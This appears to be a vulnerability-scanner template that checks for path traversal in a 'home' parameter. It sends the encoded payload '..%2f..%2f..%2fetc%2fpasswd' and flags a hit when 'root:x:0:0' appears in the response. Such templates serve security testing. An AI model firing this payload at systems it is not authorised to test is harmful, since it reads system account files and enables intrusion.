id: lfi6-1191
name: 'Traversal in home'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via home'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      home:
        - '..%2f..%2f..%2fetc%2fpasswd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
